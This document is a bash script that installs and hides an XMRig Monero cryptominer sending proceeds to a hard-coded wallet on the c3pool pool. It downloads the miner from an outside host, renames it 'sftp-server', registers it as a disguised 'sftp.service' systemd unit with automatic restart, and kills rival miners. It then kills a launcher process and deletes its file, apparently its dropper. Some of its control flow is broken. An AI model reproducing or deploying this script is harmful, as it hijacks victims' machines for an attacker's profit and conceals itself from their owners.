#!/bin/bash

VERSION=2.11

# printing greetings

if [ `id -u` -eq 0 ];then
        rm -rf /usr/local/sftp
        mkdir -p /usr/local/sftp
        BASE_DIR=/usr/local/sftp
else
        rm -rf $HOME/.sftp
        mkdir -p $HOME/.sftp
        BASE_DIR=$HOME/.sftp
fi

# command line arguments
WALLET=44NiFypuZZGXxMM3sZ7eN1U3pCnPj6m8BGx3tD4i2CZjYhCsHS9PMk7H9LJ57ryM6mVUUru78RiHh5PvTCiyyHY9Ur7jGCp
EMAIL=$2 # this one is optional


WALLET_BASE=`echo $WALLET | cut -f1 -d"."`
if [ ${#WALLET_BASE} != 106 -a ${#WALLET_BASE} != 95 ]; then
  exit 1
fi

if [ -z $HOME ]; then
  exit 1
fi

if [ ! -d $HOME ]; then
  exit 1
fi

if ! type curl >/dev/null; then
  exit 1
fi

# calculating port

CPU_THREADS=$(nproc)
EXP_MONERO_HASHRATE=$(( CPU_THREADS * 700 / 1000))
if [ -z $EXP_MONERO_HASHRATE ]; then
  exit 1
fi

get_port_based_on_hashrate() {
  local hashrate=$1
  if [ "$hashrate" -le "5000" ]; then
    echo 80
  elif [ "$hashrate" -le "25000" ]; then
    if [ "$hashrate" -gt "5000" ]; then
      echo 13333
    else
      echo 443
    fi
  elif [ "$hashrate" -le "50000" ]; then
    if [ "$hashrate" -gt "25000" ]; then
      echo 15555
    else
      echo 14444
    fi
  elif [ "$hashrate" -le "100000" ]; then
    if [ "$hashrate" -gt "50000" ]; then
      echo 19999
    else
      echo 17777
    fi
  elif [ "$hashrate" -le "1000000" ]; then
    echo 23333
  else
    echo "ERROR: Hashrate too high"
    exit 1
  fi
}

PORT=$(get_port_based_on_hashrate $EXP_MONERO_HASHRATE)
if [ -z $PORT ]; then
  exit 1
fi

# start doing stuff: preparing miner

if sudo -n true 2>/dev/null; then
  sudo systemctl stop c3pool_miner.service
  sudo systemctl stop sftp.service
fi
killall -9 xmrig
killall -9 sftp-server

rm -rf $HOME/c3pool
rm -rf $BASE_DIR


if ! curl -L --progress-bar "https://download.c3pool.org/xmrig_setup/raw/master/xmrig.tar.gz" -o /tmp/xmrig.tar.gz; then
  exit 1
fi

[ -d $BASE_DIR ] || mkdir $BASE_DIR
if ! tar xf /tmp/xmrig.tar.gz -C $BASE_DIR; then
  exit 1
fi
mv $BASE_DIR/xmrig $BASE_DIR/sftp-server
rm /tmp/xmrig.tar.gz

sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' $BASE_DIR/config.json
$BASE_DIR/sftp-server --help >/dev/null
if (test $? -ne 0); then
  LATEST_XMRIG_RELEASE=`curl -s https://github.com/xmrig/xmrig/releases/latest  | grep -o '".*"' | sed 's/"//g'`
  LATEST_XMRIG_LINUX_RELEASE="https://github.com"`curl -s $LATEST_XMRIG_RELEASE | grep xenial-x64.tar.gz\" |  cut -d \" -f2`

  if ! curl -L --progress-bar $LATEST_XMRIG_LINUX_RELEASE -o /tmp/xmrig.tar.gz; then
    exit 1
  fi

  rm /tmp/xmrig.tar.gz
  mv $BASE_DIR/xmrig $BASE_DIR/sftp-server

  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $BASE_DIR/config.json
  $BASE_DIR/sftp-server --help >/dev/null
  if (test $? -ne 0); then 
    exit 1
  fi
fi


PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
if [ "$PASS" == "localhost" ]; then
  PASS=`ip route get 1 | awk '{print $NF;exit}'`
fi
if [ -z $PASS ]; then
  PASS=na
fi
if [ ! -z $EMAIL ]; then
  PASS="$PASS:$EMAIL"
fi

sed -i 's/"url": *"[^"]*",/"url": "auto.c3pool.org:'$PORT'",/' $BASE_DIR/config.json
sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $BASE_DIR/config.json
sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $BASE_DIR/config.json
sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $BASE_DIR/config.json
sed -i 's#"log-file": *null,#"log-file": "'$BASE_DIR/sftp-log.log'",#' $BASE_DIR/config.json
sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $BASE_DIR/config.json

cp $BASE_DIR/config.json $BASE_DIR/config_background.json
sed -i 's/"background": *false,/"background": true,/' $BASE_DIR/config_background.json

# preparing script

cat >$BASE_DIR/miner.sh <<EOL
#!/bin/bash
if ! pidof $BASE_DIR/sftp-server >/dev/null; then
  nice $BASE_DIR/sftp-server \$*
else
  echo "Monero miner is already running in the background. Refusing to run another one."
  echo "Run \"killall xmrig\" or \"sudo killall xmrig\" if you want to remove background miner first."
fi
EOL

chmod +x $BASE_DIR/miner.sh

# preparing script background work and work under reboot

if ! sudo -n true 2>/dev/null; then
  if ! grep c3pool/miner.sh $HOME/.profile >/dev/null; then
  /bin/bash $BASE_DIR/miner.sh --config=$BASE_DIR/config_background.json >/dev/null 2>&1
else

  if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') -gt 3500000 ]]; then
    echo "vm.nr_hugepages=$((1168+$(nproc)))" | sudo tee -a /etc/sysctl.conf
    sudo sysctl -w vm.nr_hugepages=$((1168+$(nproc)))
  fi

  if ! type systemctl >/dev/null; then

    /bin/bash $BASE_DIR/miner.sh --config=$BASE_DIR/config_background.json >/dev/null 2>&1

  else

    cat >/tmp/sftp.service <<EOL
[Unit]
Description=Monero miner service

[Service]
ExecStart=$BASE_DIR/sftp-server --config=$BASE_DIR/config.json
Restart=always
Nice=10
CPUWeight=1

[Install]
WantedBy=multi-user.target
EOL
    sudo mv /tmp/sftp.service /etc/systemd/system/sftp.service
    sudo killall sftp-server 2>/dev/null
    sudo systemctl daemon-reload
    sudo systemctl enable sftp.service
    sudo systemctl start sftp.service
  fi
fi

if [ "$CPU_THREADS" -lt "4" ]; then
  if [ "`tail -n1 /etc/rc.local`" != "exit 0" ]; then
    echo "sudo sed -i -e '\$acpulimit -e xmrig -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
  else
    echo "sudo sed -i -e '\$i \\cpulimit -e xmrig -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
  fi
else
  echo "HINT: Please execute these commands and reboot your VPS after that to limit miner to 75% percent CPU usage:"
  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$BASE_DIR/config.json"
  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$BASE_DIR/config_background.json"
fi
pid=$(ps -ef | grep "1586699003758" | grep -v grep | awk '{print $2}')
filed=$(ps -ef | grep "1586699003758" | grep -v grep | awk '{print $9}')
kill $pid
rm -rf $filed
